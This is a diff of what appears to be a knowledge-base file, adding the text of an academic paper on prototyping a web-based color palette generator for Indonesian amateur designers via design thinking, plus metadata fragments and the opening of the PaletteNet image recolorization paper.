+generator prototype using the design thinking method.
+The prototype will provide amateur designers with
+a user-friendly interface and a wide range of color
+palette options. The findings are expected to contribute
+fundamentally to the field of User Experience (UX) design
+and color harmony studies, focusing on original ideas to
+support the development of science and technology.
+## 1.1 Design Thinking
+The concept of design thinking has been present since
+the 1960s, initially referred to as design science. Design
+thinking guides designers in thinking differently and
+generating new ideas to discover optimal designs
+through breakthrough design concepts, leading to
+the creation of more innovative products (Darmawan
+et al., 2022). Over the past 50 years, studies on design
+thinking, utilizing a cognitive paradigm approach, have
+defined design as an intentional activity that evolves
+over time, influenced by its social context, including
+personal factors such as the designer's experience
+and design learning. The definition depends on the
+design path chosen (Gero & Milovanovic, 2020). Design
+thinking is a repetitive procedure in which designers
+strive to understand users, challenge assumptions,
+and redefine problems to identify alternative solutions
+and strategies that may not be directly visible with
+a preliminary understanding. Concurrently, design
+thinking offers a solution-oriented approach to problem-
+solving (Interaction Design Foundation, 2020). There are
+numerous variants of the design thinking process in use
+today, typically comprising of three to seven phases,
+stages, or modes. Nevertheless, all design thinking
+variants share striking similarities.
+## 1.2 Color Harmony
+Color possesses three attributes: hue, saturation, and
+brightness. Colors are systematically categorized into
+three groups: Primary (red, blue, yellow), Secondary
+(combination of primary colors), and Tertiary (or
+intermediate – a blend of primary and secondary colors).
+Citing  Stokley (2018), modern color theory is grounded
+in Newton's color wheel. Traditionally, the color wheel,
+based on the three primary colors of red, yellow, and
+blue, is still employed in art for creating harmonious color
+schemes. Many early studies on color harmony focus on
+developing color harmony principles based on the color
+wheel. Itten, as cited by Ou and Luo (2006) in their color
+harmony theory, it indicates that colors will harmonize
+if their positions in the color wheel form well-defined
+polygons, such as dyads, triads, tetrads, and hexads.
+Another source (Weingerl & Javoršek, 2018) concludes
+that there are six color combinations or harmonies:
+monochromatic, complementary, analogous, triadic,
+split complementary, and tetradic harmony.
+1.3 User Experience (UX) Design
+User Experience (UX) Design involves crafting the ideal
+experience when using a service or product. Thus,
+UX Design can encompass all types of products and
+services, for example, designing exhibitions in museums.
+However, in essence, the term User Experience Design is
+commonly used in relation to websites, web applications,
+and other software applications (Interaction Design
+Foundation, 2020). Additionally, User Experience (UX)
+pertains to individuals' feelings while interacting with
+a product or service.  The product will typically be a
+website or an application in different formats.  Human-
+object interactions involve user experiences; however,
+UX practitioners primarily focus on the relationship
+between human-computer interactions and computer-
+based products like websites, applications, and systems.
+## 2. METHODOLOGY
+The current study employed the design thinking
+method, as conducted in prior research (Srisombut et
+al., 2021; Soedewi et al., 2022; Sungboonlue et al., 2022).
+Furthermore, the Design Thinking method is currently
+adopted by unicorn startups and medium-sized startups
+in product development. This method represents
+an evolution from previous approaches, enabling
+a reduction in time, cost, and energy expenditure
+in development compared to alternative methods
+(Darmawan et al., 2022).
+This research focuses on the design thinking approach
+formulated by the Interaction Design Foundation
+(Interaction Design Foundation, 2020), which comprises
+five (5) stages of design thinking as follows: empathize,
+define, ideate, prototype, and test. The organization
+(Interaction Design Foundation/ IDF) adopts the design
+thinking proposed by the Hasso-Plattner Institute of
+Design at Stanford (also known as 'd.school'). The IDF
+adopts the d.school methodology due to its leadership
+in the use and instruction of design thinking.
+During the empathize stage, a preliminary survey (online
+questionnaire) was conducted by inviting users such as
+communities, entrepreneurs, and other relevant parties,
+involving 35 respondents. Subsequently, interviews were
+conducted by inviting some respondents from the earlier
+online questionnaire. The interviews were carried out
+both face-to-face and online to pose several questions
+and conduct usability testing. Users were assigned tasks,
+observed, and then asked about their experiences
+when accessing the website. The study focused on the
+Color Palette Generator (CPG) website with a sample
+size of N=5, as the user testing keeps the optimal ratio
+
+paperASIA 41 (4b):  2025   64
+COMPENDIUM by paperASIA
+about 5 to 10 users (Nielsen & Landauer, 1993; Nielsen,
+2000; Faulkner, 2003). The criteria for the study object
+were the top-rated CPG websites according to Search
+Engine Optimization (SEO), considered the most popular
+CPGs.
+The define stage is a further step in product development,
+concentrating on understanding user problems and
+needs (Darmawan et al., 2022). During this stage, the
+issues faced are curated to serve as the foundation for
+formulating solutions. Additionally, to deepen insights
+from users (five interview participants), a review of prior
+research on similar topics was conducted.
+
+The user journey in the process of searching for colors
+is initially mapped out in the form of a User Journey
+Map, which serves as a reference for analyzing the
+user's journey in using the color generator in general.
+An Empathy Map approach was then employed to
+design a model with a user-centered design approach
+that focused on the environment, behavior, and things
+deemed important by users. The Empathy Map was
+designed based on four (4) areas: Says - what the
+user expresses in public spaces, Thinks - the user's
+thoughts related to the experiences they go through,
+Does - behaviors that may occur as a response to the
+perceived experience, and Feels - sensory perceptions
+or feelings in the user's mind (Bittner & Shoury, 2019).
+The user persona was employed to gain an understanding
+of the users as the focus of the research. This persona
+technique is commonly used to enhance stakeholders'
+understanding of customers or users (Jansen et al., 2020).
+The Value Proposition Canvas method was then utilized
+to clarify the understanding of users and describe the
+expected benefits and functions desired in a product
+or service. This research employed the Value Proposition
+Canvas method by Osterwalder et al. (2014) which
+includes two areas of analysis: customer profile and
+value map.
+From the root of the existing problems, ideation
+was formulated using brainstorming techniques by
+evaluating achievements, assumptions, and ideas
+to generate user flows and sitemaps, as done by
+Darmawan et al. (2022). The results of brainstorming,
+presented in qualitative data, were then processed
+using an affinity diagram by clustering ideas into groups
+with similarities (Lucero, 2015). The affinity diagram
+in this research aimed to categorize potential ideas
+and solutions based on empathy towards users in the
+previous stage.
+The feature points proposed in the affinity diagram
+process were then mapped to find priorities using a
+feature prioritization matrix. The prioritization matrix is
+a 2D visual that indicates the importance level of a set
+of ideas mapped based on criteria (Gibbons, 2021).
+The matrix used in this research referred to the method
+used by Dwight D. Eisenhower (Eisenhower, 1964), where
+idea points were mapped into four quadrants based on
+importance and urgency (Bratterud et al., 2020).
+Further analysis was conducted to process prioritized
+features quantitatively using the RICE prioritization
+framework, aiming to eliminate subjectivity. The RICE
+method is an acronym for four measurement factors:
+Reach (the number of users affected), Impact (the
+impact on users), Confidence (the estimated level of
+confidence in the impact), and Effort (the amount of
+effort needed for implementation) (Mcbride, 2018).
+The research then continued by creating a web-based
+Color Palette Generator prototype in a mock-up, starting
+with a Mobile-First Approach. This stage consisted of a
+Low-Fidelity Wireframe and a High-Fidelity Wireframe.
+Prototyping was carried out by establishing a UI style
+guide and simultaneously creating prototypes using the
+Figma browser-based design tool. In the exploration and
+experimentation stage, the prototype's interface was
+created using the Low-Fidelity Wireframe approach to
+design a simple layout for faster iterations (Ali & Lande,
+2019). The design of High-Fidelity Wireframes was then
+carried out to create more detailed simulations as an
+implementation of the previously determined style
+guide. The entire prototyping process in this research
+followed a mobile-first approach, which was considered
+more efficient in digital product development, allowing
+designers to focus on interaction design and deliver a
+high-quality user experience (Aggarwal et al., 2023).
+## 3. RESULTS AND DISCUSSION
+This study adopted the design thinking approach
+formulated by the Interaction Design Foundation
+(Interaction Design Foundation, 2020), comprises five (5)
+stages of design thinking as follows: empathize, define,
+ideate, prototype, and test.  However, this paper focuses
+on the first four stages—empathize, define, ideate, and
+prototype—while the testing stage will be addressed in
+future research.
+## 3.1 Empathize
+Initially, the survey served as a preliminary study
+aimed to gain insights into the elements considered
+when determining packaging design. The study
+delved into the reasons why color is recognized as a
+crucial element in designing packaging. The survey
+also sought to explore the references and sources
+that influence decision-making regarding packaging
+color. Additionally, the research aimed to assess the
+significance attributed to the use of color in packaging
+and to uncover any challenges encountered in the color
+selection process. The collected data were processed
+using quantitative descriptive analysis, involving 35
+individuals in the survey (Swasty et al., 2024), providing
+
+65  paperASIA 41 (4b):  2025
+COMPENDIUM by paperASIA
+an overview of how amateur designers approach the
+implementation of color selection.
+Subsequently, the study proceeded with a qualitative
+interview with users who met the criteria. The interview
+process commenced with an inquiry into the participants'
+approaches to packaging design, exploring whether
+they undertake the design independently, employ
+design services from printing or offset facilities, or hire
+professional packaging designers. The study found
+that most of them were designed independently
+due to a limited budget. Subsequently, the interviews
+delved deeper into understanding the reasons behind
+considering color as a key element in packaging design.
+In addition, the interviews sought to reveal the
+challenges faced by participants in selecting packaging
+colors. Participants shared their challenges in color
+management, specifically in converting from screen to
+print, while some of them mentioned their lack of design
+knowledge. The study also investigated the methods
+employed in choosing packaging colors, ranging
+from referencing platforms like Pinterest or Instagram,
+utilizing color palette generators, to the spontaneous
+selection of colors based on intuition or randomness.
+The study found that their color palette inspiration came
+from references to products in markets, followed by
+references from the internet and price consideration.
+Before conducting the usability test on several web-
+based color palette generators (CPG) available online,
+participants were asked about their familiarity with
+CPG and whether they had previous experience using
+color palette generators. This preliminary inquiry sought
+to assess their current level of familiarity and expertise
+in using it. Participants who had previous knowledge
+of CPG or had used similar tools would need less
+information and guidance during the usability test.
+After participants experimented with five color palette
+generator websites, the interview proceeded with
+questions focusing on UI/UX design, including their
+overall impressions or opinions of the websites they
+had tried and how easy the websites were to use.
+Subsequently, participants were asked to select the
+best-performing website to be used as a reference for
+the following questions. The questions encompassed
+inquiries about positive aspects, drawbacks, challenges
+faced, and suggestions for improvement or additional
+features they would like to get from the website. The
+interviews aimed to gather detailed insights into the
+user experience, allowing for a thorough evaluation
+of the usability and design aspects of the online color
+palette generators.
+The user empathy map (Figure  1) was then created
+based on the interviews conducted with the participants.
+It aimed to capture their emotions, thoughts, pain,
+and gains during their experiences with the online
+color palette generators. By mapping out their needs
+and desires, the empathy map provided a deeper
+understanding of the users' perspectives, enabling
+designers to empathize with their experiences and
+make informed decisions to enhance the usability and
+design of the CPG.
+Figure 1:  User empathy map
+
+paperASIA 41 (4b):  2025   66
+COMPENDIUM by paperASIA
+## 3.2 Define
+After the data was collected, analyzed, and processed
+in the empathize stage, the next step was to synthesize
+that data into a series of information that served as the
+foundation for determining the solution.
+## 3.2.1 User Persona
+This study encompassed several customer personas.
+Among these personas was an individual aged 28, an
+entrepreneur without a design education background
+and a novice designer with less than five clients'
+experience. To craft a User Journey Map, the research
+focused on the group with limited design insights within
+the productive age range. This group was represented
+by Rani Asisah, a bachelor who is starting a coffee
+shop business. She envisions developing this business in
+the long term, emphasizing the importance of having
+good branding guidelines, especially for the logo and
+packaging. Therefore, having accessible and easy-to-
+understand tools would greatly assist him in designing
+brand guidelines for his growing business (Figure 2).
+## 3.2.2 User Stories
+This research was conducted with a user-centric
+approach, where the user was at the center of
+consideration when deciding on a design solution.
+Referring to the previously established personas, user
+stories were created to construct scenarios and define
+user needs as the basis for product development.
+User stories summarize what users want from a digital
+product to help them accomplish a task. According to
+the persona in this study, the user stories are as follows:
+"As Rani Asisah, a young entrepreneur with limited design
+knowledge, I want to be able to implement colors
+on my product packaging quickly and accurately to
+enhance the visual quality to stand out in the market
+and increase profits."
+## 3.2.3 Emotional Journey Map
+The Emotional Journey Map method maps user
+stories and feelings, representing a commonly used
+approach in agile digital product development. The
+research adopted the perspective of nine (9) interview
+participants. This sample size aligns with established
+recommendations in UX research literature, particularly
+the foundational works of Nielsen (2000) and Faulkner
+(2003), who suggest that a range of 5 to 10 participants
+is generally sufficient to uncover the majority of usability
+issues. Initially, the research aimed for a minimum
+of five participants; however, due to the availability
+of additional resources, the sample was expanded
+to ten. One participant's data was excluded due to
+incompleteness, resulting in a final count of nine valid
+datasets.
+Figure 2:  User persona
+
+67  paperASIA 41 (4b):  2025
+COMPENDIUM by paperASIA
+Given that this UX research was conducted in its early
+stages and under a tight schedule, selecting nine
+qualified participants was a strategic decision to
+balance cost-efficiency and time-efficiency while still
+ensuring data quality and depth of insight. The study
+was then transformed into a Journey Map containing
+user triggers and goals, activities undertaken to
+achieve goals, user behaviors or feelings, and obstacles
+during the process (pain points). This mapping aimed
+to understand how users interact with a similar color
+generator website, providing a basis for planning a
+better user experience design.
+A crucial step before creating the Journey Map is
+determining relevant personas to illustrate processes
+representing user groups. The persona for the journey
+map slightly differs from the previously created user
+persona due to the addition of scenarios and simulation
+of activities involving emotions in the decision-making
+process. The chosen persona is Rani Asisah asked to
+decide the theme or color palette for her coffee shop
+business branding concept that fits her personality. For
+Rani Asisah, choosing one color from numerous options is
+not an easy task, prompting her to seek assistance from
+the Color Palette Generator (CPG) (Figure 3).
+The next step involved observing user behavior in
+using the system and completing tasks related to the
+application or website. The tasks observed for users
+included evaluating the https://mycolor.space/  website
+(MyColorSpaces, n.d.), searching and deciding on
+one color for the generation process, accessing the
+color palette recommendation page, and deciding
+on one color palette. Figure  4 shows the results from
+the completed Journey Map, along with the emotional
+map.
+Based on the results of the Journey Map, there were two
+pain points or constraints experienced by users: when
+deciding on one initial color for the palette generation
+process and selecting one color to be used as the final
+combination. Through observation, it is normal for users
+to face challenges in deciding on one color due to the
+human ability to interpret 1000 levels of brightness and
+darkness and 100 levels for each color in the red-green
+and yellow-blue spectrums, resulting in 10,000,000
+available colors. However, other factors can influence
+this decision-making process, such as issues with the
+originality of ideas and concepts, and not recognizing
+personal character or taste well. These challenges can
+serve as a basis for creating future product development
+plans that assist users in determining colors based on
+their original personal preferences, allowing them to
+decide on colors more quickly and accurately.
+Figure 3:  User persona with additional feelings and scenarios
+Figure 4: User Journey Map during accessing https://mycolor.space/ (MyColorSpaces, n.d.)
+
+paperASIA 41 (4b):  2025   68
+COMPENDIUM by paperASIA
+## 3.2.4 Value Proposition Canvas
+The Value Proposition Canvas is one of the methods
+introduced by Osterwalder et al. (2014) and aims to
+assist in designing value for customers in a product. This
+framework originated from the Business Model Canvas
+but is specifically focused on customer segments and
+value propositions. Customer Segments encompass the
+types of customers served by a business, while the value
+proposition contains the value offered to customers.  The
+Value Proposition Canvas method assisted in designing
+a specific value for the color generator website that
+was being developed. The mapping of values used a
+user-centric approach, enhancing designers' empathy
+towards users and facilitating the communication of the
+intended values. Figure 5 is the Value Proposition Canvas
+for the color generator based on the interview results
+and specified user personas. Based on the user profiles
+and mapped values, a proposition can be drawn that
+describes the ideal product that can be developed
+for color generator users. The value proposition in
+this study was "designing a free tool application
+accessible for everyone to determine color palette
+more quickly, thereby enhancing the independence
+and competence of product owners to grow their
+businesses."
+## 3.3 Ideate
+The ideation stage was crucial in determining solutions
+to the previously defined problems. In this phase,
+several alternative problem-solving options were
+evaluated using the data collected from the empathize
+and define stages. The empathetic understanding
+of users revealed several users' needs that had the
+potential for development, particularly in the areas
+of education, features, and data output related to
+color implementation. Based on the analysis in Table
+1, the card sorting method was employed to discuss
+possible tangible solutions that could be executed in
+features and displays within the color palette generator
+website. Based on the brainstorming results, potential
+features to be developed are outlined in Table  2. To
+simplify the content in the matrix, the results of the
+brainstormed feature options were sorted to facilitate
+prioritization. Feature sorting was done by combining
+similar features and considering feasibility, ease of
+execution, and uniqueness. A priority matrix was then
+created to identify and measure the urgency level of
+each feature, enabling the decision on which features
+to develop first (Figure 6).
+Figure 5: Value proposition for developing Color Pallete Generator
+## Table 1: Potential Development Analysis
+
+69  paperASIA 41 (4b):  2025
+COMPENDIUM by paperASIA
+Table 2: Potential Features and Contents
+Figure 6: Feature priority matrix
+
+paperASIA 41 (4b):  2025   70
+COMPENDIUM by paperASIA
+Based on Figure  6, the color decision-making, poster
+color guidelines, and color palette generator are the
+top three priority features for development, considering
+their level of influence and ease of implementation. The
+second priority includes the step-by-step tutorial for
+feature usage within the website, image picker, color
+education, and the color trends page. The third priority
+is color search based on keywords and the contrast
+checker.
+## 3.4 Prototype
+Prototyping is one of the methods in digital product
+development that involves creating a visualization
+of  the  interface  along  with  the  general  system
+functionalities. This interface visualization manifests the
+user requirements defined in the empathize and define
+stages. The prototyping of the Color Palette Generator
+website was conducted using a mobile-first approach.
+The mobile-first approach is an interaction visual
+approach based on the dimensions of a smartphone
+screen. This approach is considered effective because
+the small canvas size can expedite the lay outing
+process of interface components. Moreover, based
+on the results of in-depth interviews, the device most
+commonly used by users is a smartphone, constituting
+91% of the data collection from a preliminary survey
+(online questionnaire) that involved 35 respondents.
+The initial design phase was carried out by sketching
+on paper and repeatedly designing a single page to
+obtain several potential layouts. Information mapping
+was simultaneously conducted for user flow visualization.
+The obtained information result is seen in Figure 7.
+Figure 7: Information architecture
+The prototyping of the interface is generally divided
+into two types based on its level of detail: Low-Fidelity
+Prototyping and High-Fidelity Prototyping. In the early
+development of the Color Palette Generator, wireframe
+sketch (Figure 8) and Low Fidelity Prototyping (Figure 9)
+were used to expedite the visualization of the interface,
+enabling faster feedback collection for subsequent
+iterations. The wireframe sketch 0to facilitate easier
+layouting of the UI elements, while the Lo-Fi prototype
+was built to enhance communication between the UX
+researcher and the UI designer. The ultimate goal of
+developing a low-fidelity prototype is to ensure that
+all content and features in the system align with the
+ideation data.
+Figure 8: Wireframe sketch UI
+Broadly, the Color Palette Generator website consists of
+five main sections: the onboarding page, homepage,
+color palette generator feature, color exploration
+feature, and color education page. The first page on
+this color generator website is the onboarding page.
+This page defines the system's core values, providing
+users with an overview of the experience or benefits of
+the proposed website. Based on the results of in-depth
+interviews, the percentage of participants unfamiliar
+with using the color generator is larger than those
+familiar. Therefore, an onboarding page is expected
+to increase user awareness and briefly explain the
+product before engaging in a series of tasks on the
+website (Figure 10).
+Employing the eight golden rules, the prototype is
+designed to align with the usability goals, requirements,
+and the defined user experience. The UI/UX design
+utilizes color generators and assessment tools, which
+allow for quick color decision-making by the user.
+On the homepage, features are placed based on
+prioritization, which includes the color palette, color
+quiz, and educational pages. The color quiz is projected
+as a novel feature that invites users to complete the
+color assessment with engaging visualizations. Color
+
+71  paperASIA 41 (4b):  2025
+COMPENDIUM by paperASIA
+assessment will result in a color guidelines poster (Figure
+11). The color guidelines provided from this can be used
+in various marketing elements. By having proper color
+guidelines, business owners are expected to improve the
+competitiveness of their brand and enhance the visual
+appeal of their products to stand out in the market. This
+website fully uses Bahasa Indonesia as the main copy
+and UX writing. However, finding the proper translation
+to Bahasa Indonesia for some design terms such as
+generator, opaque, color maps, and contrast checker,
+was an obstacle. Some familiar English words remain as
+they are to avoid misunderstanding by the user.
+## 4. CONCLUSION
+This research aimed to create the prototype design of
+a web-based color palette generator using the design
+thinking approach. The empathize phase involved
+distributing online questionnaires and conducting
+interviews. Subsequently, the define phase utilized user
+persona analysis, emotional journey mapping, and
+value proposition canvas. From the empathize phase,
+it can be defined that users as entrepreneurs without a
+design background, looking to decide on colors for their
+product branding using a color generator but facing
+challenges in choosing a color palette that aligns with
+their personality. Therefore, they needed a product to
+help them determine colors more quickly, enhancing
+the owner's self-reliance and competence to develop
+their business. The ideate phase involved brainstorming
+to formulate potential features and content. Finally,
+the prototype phase was carried out by designing
+both low and high-fidelity versions. The prototype was
+designed using Bahasa Indonesia, as from emphatize
+revealed that users needed the application in their
+local language.
+The study acknowledges the difficulties that amateur
+designers encounter when selecting appropriate
+color palettes. The research seeks to empower them in
+developing their businesses by offering a tool in the local
+language that enables them to easily determine colors,
+thus improving their self-reliance and competence. This
+present study was limited to exploring a prototype of
+a website-based Color Palette Generator. Therefore,
+further research on usability testing and hermeneutic
+evaluation for this designed Color Palette Generator
+website is needed. The testing is expected to determine
+whether the prototype design based on this research is
+visually appealing and facilitates the user experience
+and to recommend some improvements.
+Figure 9:  Low fidelity prototype
+
+paperASIA 41 (4b):  2025   72
+COMPENDIUM by paperASIA
+## Figure 10:  High Fidelity Prototype
+Figure 11:  High Fidelity Prototype (Quiz Feature)
+
+73  paperASIA 41 (4b):  2025
+COMPENDIUM by paperASIA
+## REFERENCES
+Aggarwal, R., Sidnam-Mauch, E., Neffa-Creech, D.,
+## Plant, A., Williams, E., Shami, E., Menon, U., George,
+S., & Langbaum, J. B. (2023). Development of a
+Mobile-First Registry to Recruit Healthy Volunteers
+and Members of Underrepresented Communities
+for Alzheimer’s Disease Prevention Studies. J Prev
+Alz Dis, 4(10), 857–864. https://doi.org/dx.doi.org/
+## 10.14283/jpad.2023.86
+Ali, H., & Lande, M. (2019). Data-Driven Decisions
+in Prototyping and Product Development: A
+Framework for Uncertainity and Decision-Making.
+## The International Mechanical Engineering
+Congress & Exposition ASME 2019, November, 1–7.
+https://doi.org/10.1115/IMECE2019-11671
+## Bartlett, R., Boyle, J. A., Simons Smith, J., Khan, N.,
+## Robinson, T., & Ramaswamy, R. (2021). Evaluating
+human-centred design for public health: a case
+study on developing a healthcare app with
+refugee communities. Research Involvement and
+Engagement, 7(32), 1–13. https://doi.org/ 10.1186/
+s40900-021-00273-2
+## Bittner, E. A. C., & Shoury, O. (2019). Designing Automated
+Facilitation for Design Thinking: A Chatbot for
+Supporting Teams in the Empathy Map Method.
+Proceedings of the Annual Hawaii International
+Conference on System Sciences, 227–236. https://
+doi.org/10.24251/hicss.2019.029
+## Bratterud, H., Burgess, M., Fasy, B. T., Millman, D. L., Oster,
+T., & Sung, E. (Christine). (2020). The Sung Diagram:
+Revitalizing the Eisenhower Matrix. In A. Pietarinen,
+## P. Chapman, L. Bosveld-de Smet, V. Giardino,
+J. Corter, & S. Linker (Eds.), Diagrammatic
+Representation and Inference. Diagrams 2020.
+Lecture Notes in Computer Science: Vol. LNAI
+12169 (Issue August, pp. 498–502). Springer. https://
+doi.org/10.1007/978-3-030-54249-8_43
+## Darmawan, I., Anwar, M. S., Rahmatulloh, A., & Sulastri,
+H. (2022). Design Thinking Approach for User
+Interface Design and User Experience on Campus
+## Academic Information Systems. International
+Journal on Informatics Visualization, 6(2), 327–334.
+https://doi.org/10.30630/joiv.6.2.997
+Eisenhower, D. D. (1964). Address at the Second Assembly
+of the World Council of Churches.
+Faulkner, L. (2003). Beyond the five-user assumption:
+Benefits of increased sample sizes in usability
+testing. Behavior Research Methods, Instruments,
+& Computers, 35(3), 379–383. https://doi.org/
+## 10.1109/DCABES.2011.32
+Gero, J. S., & Milovanovic, J. (2020). A framework for
+studying design thinking through measuring
+designers’ minds, bodies and brains. Design
+Science, 6(19), 1–40. https://doi.org/ 10.1017/
+dsj.2020.15
+Gibbons, S. (2021). 5 Prioritization Methods in UX
+Roadmapping. Nielsen Norman Group. https://
+www.nngroup.com/articles/prioritization-
+methods/
+Interaction Design Foundation. (2020). The Basics of
+User Experience Design. In The Basics of User
+Experience Design. Interaction-Design.org.
+interaction-design.org
+## Jansen, B. J., Salminen, J. O., & Jung, S. G. (2020). Data-
+Driven Personas for Enhanced User Understanding:
+Combining Empathy with Rationality for Better
+Insights to Analytics. Data and Information
+Management, 4(1), 1–17. https://doi.org/ 10.2478/
+dim-2020-0005
+## Lawrence, K., Cho, J., Torres, C., & Alfaro-arias, V. (2022).
+Building Virtual Health Training Tools for Residents:
+A Design Thinking Approach. Frontiers in Digital
+Health, 4(June), 1–7. https://doi.org/10.3389/
+fdgth.2022.861579
+Lucero, A. (2015). Using Affinity Diagrams to Evaluate
+Interactive Prototypes. 15th Human-Computer
+Interaction (INTERACT), 231–248. https://doi.org/
+## 10.1007/978-3-319-22668-2-19
+Mcbride, S. (2018). RICE : Simple prioritization for product
+managers. Intercom. https://www.intercom.
+com/ blog/rice-simple-prioritization-for-product-
+managers/
+## Muzli Color. (n.d.). Color Palette Generator: Create
+Beautiful Color Schemes that works. Https://Colors.
+Muz.Li/. https://colors.muz.li/
+MyColorSpaces. (n.d.). Never waste Hours on finding
+the perfect Color Palette again! Https://Mycolor.
+Space/. https://mycolor.space/
+Nielsen, J. (2000). Why You Only Need to Test with 5 Users.
+Nielsen Norman Group. https://doi.org/ http://
+www.useit.com/alertbox/20000319.html
+## Nielsen, J., & Landauer, T. K. (1993). A Mathematical
+Model of the Finding of Usability Problems.
+Conference on Human Factors in Computing
+Systems - Proceedings, 206–213. https://doi.org/
+## 10.1145/169059.169166
+## Osterwalder, A., Pigneur, Y., Bernarda, G., & Smith, A.
+(2014). Value Proposition Design (1st ed.). Wiley.
+Ou, L.C., Luo, R. . (2006). A Study of Colour Harmony for
+Two-Colour Combinations. COLOR Research and
+Application, 31, 191–204. http://www.idemployee.
+id.tue.nl/g.w.m.rauterberg/conferences/CD_
+doNotOpen/ADC/final_paper/218.pdf
+## Palette Generator. (n.d.). Palette Generator. Https://
+## Palettegenerator.com/.
+## Puebla, C., Fievet, T., García, J., Tsopanidi, M., & Clahsen,
+H. (2022). Promoting social and collaborative
+language learning among older adults in the
+digital era: Development and evaluation of
+a smartphone app prototype using a design-
+thinking approach. Gerontechnology, 21(1), 1–12.
+https://doi.org/10.4017/GT.2022.21.1.483.06
+## Ranti, C. D., & Lee, H. (2023). Design Thinking Approach
+for Sustainable Hospitality: A Smart Mobile
+Management System for Indonesia. Archives of
+
+paperASIA 41 (4b):  2025   74
+COMPENDIUM by paperASIA
+## Design Research, 36(4), 163–191.
+## Soedewi, S., Mustikawan, A., & Swasty, W. (2022).
+Penerapan Metode Design Thinking pada
+Perancangan Website UMKM Kirihuci. Visualita
+## Jurnal Online Desain Komunikasi Visual, 10(02), 79–
+- https://doi.org/10.34010/visualita.v10i02.5378
+## Srisombut, T., Thamlersak, S., Chaitantipong, P., &
+## Siriborvornratanakul, T. (2021). Design Thinking
+Approach for the Development of Theme Park
+## Application. Augmented Human Research, 6(17).
+https://doi.org/10.1007/s41133-021-00054-2
+Stokley, S. R. (2018). Historic Look on Color Theory
+[Johnson & Wales University]. https://scholarsar
+chive.jwu.edu/student_scholarship
+## Sungboonlue, P., Thanakaew, S., Rangseepanya, K.,
+## Tangpatong, T., & Siriborvornratanakul, T. (2022).
+A study of redesigning food delivery application
+in Thailand. Telkomnika (Telecommunication
+Computing Electronics and Control), 20(5),
+1073–1082. https://doi.org/10.12928/TELKOMNIKA.
+v20i5.24094
+## Swasty, W., Soedewi, S., Mustikawan, A., Mukmin, M. A., &
+## Hafidzan, M. A. (2024). Crafting Empathy : A Study
+on User Experience in Color Palette Generator
+Websites among the Indonesian SMEs. In M.
+Rosandini (Ed.), 11th Bandung Creative Movement
+2024 (Vol. 11, pp. 1–19). Telkom University.
+## Wahyudi, N., Hendradewa, D., Makbulloh, Heriyani, D.,
+## Mahendra, E., Syahputra, A., Juanda, & Dewi, S.
+(2023). Jangan Main-main dengan Kemasan. Elex
+## Media Komputindo.
+Weingerl, P., & Javoršek, D. (2018). Theory of colour
+harmony and its application. Tehnicki Vjesnik,
+25(4), 1243–1248. https://doi.org/10.17559/TV-
+## 2017031 6092852
 
 ---
-
-## ⚠️ Breaking Changes
-
-**Tidak ada breaking changes.** Implementasi ini fully backward compatible:
-
-- `searchKnowledge()` tetap return `string[]` (array of filenames)
-- Fallback ke regex tag index kalau vector search gagal
-- `identifyCategory()` tetap return single string untuk `shelve()` compatibility
-
----
-
-> **METADATA (NEXUS SEMANTIC TAGS)**: [performance, architecture, database, tdd, semantic-search, v3.2.0]  
-> **NEXUS STANDARD**: [RECURSIVE_EVOLUTION_ARCHITECT.md](../other/NEXUS_RECURSIVE_EVOLUTION_ARCHITECT.MD)  
-> _Generated by Nexus Senior AI Review | Status: READY_FOR_IMPLEMENTATION_
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, tdd, vcs, api]
 
 ### 📘 KNOWLEDGE: NEXUS_AGENTIC-JAVASCRIPT-TOOLS.MD
 
@@ -2954,6 +8679,2505 @@ if (CSS.supports('inline-size', 'calc-size(auto, size + 0px)')) {
 ---
 > **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux]
 
+### 📘 KNOWLEDGE: NEXUS_CHO_PALETTENET_IMAGE_RECOLORIZATION_CVPR_2017_PAPER.MD
+
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+PaletteNet: Image Recolorization with Given Color Palette
+## Junho Cho, Sangdoo Yun, Kyoungmu Lee, Jin Young Choi
+ASRI, Dept. of Electrical and Computer Eng., Seoul National University
+{junhocho, yunsd101, kyoungmu, jychoi}@snu.ac.kr
+## Abstract
+Image recolorization enhances the visual perception of
+an image for design and artistic purposes. In this work, we
+present a deep neural network, referred to as PaletteNet,
+which recolors an image according to a given target color
+palette that is useful to express the color concept of an im-
+age. PaletteNet takes two inputs: a source image to be re-
+colored and a target palette. PaletteNet is then designed
+to change the color concept of a source image so that the
+palette of the output image is close to the target palette. To
+train PaletteNet, the proposed multi-task loss is composed
+of Euclidean loss and adversarial loss. The experimental
+results show that the proposed method outperforms the ex-
+isting recolorization methods. Human experts with a com-
+mercial software take on average 18 minutes to recolor an
+image, while PaletteNet automatically recolors plausible re-
+sults in less than a second.
+## 1. Introduction
+Color is an essential element of humans’ visual percep-
+tions of their daily lives. Beautiful color harmony in art-
+works or movies fulfills our desires for color. Thus, design-
+ers and artists must put effort into building basic color con-
+cepts into their works. A sophisticated selection of color
+gives a sense of stability, unity, and identity to works. In
+general, designers express a color concept through a color
+palette. The color palette of an image represents the color
+concept of an image with six colors ordered as shown in
+Figure 1.  The corresponding color palette that contains
+distinctive color concept is subjective, and the number of
+palettes is uncountable. Typical designers would carefully
+select a color concept by the palette prior to the work. Fur-
+thermore, recoloring an image with a target color palette
+is preferred for images to maintain uniformity and identity
+among artworks. Thus, the recolorization problem occupies
+a critical position in enhancing the visual understanding of
+viewers.
+Researchers have been tackling the recolorization prob-
+lem with various approaches and purposes. Kuhnet al. [9]
+Figure 1.The Images and the Corresponding Palettes.The
+palettes express color concept of the images. Collected fromDe-
+signseeds.com[1]
+Figure 2.Our Conceptual Recoloring Model.From a pair of a
+source image and a target palette, the resulted image is recolored
+according to the color concept of the target palette.
+proposed a practical way to enhance visibility for the color-
+blind (dichromat) by exaggerating color contrast. However,
+it ignored the color concept and lacked aesthetics. Casacaet
+al. [2] proposed a colorization algorithm that requires seg-
+mentation masks and user’s hints for the colors of some pix-
+els. Even though the colorization based on the color hints
+was considered the desired color for each pixel, the algo-
+rithms were far from automatic colorization.
+To reflect the intended color concept, the color palette-
+based methods [5, 3] have been proposed.  Greenfieldet
+al. [5] proposed a color association method using palettes.
+It extracted the color palettes of the source and target images
+and recolored the source image by associating the palettes
+in the color space. Changet al. [3] proposed a color trans-
+ferring algorithm using the relationship between the palettes
+of the source and target images. This approach helped users
+to have elaborate control over the intended color concept.
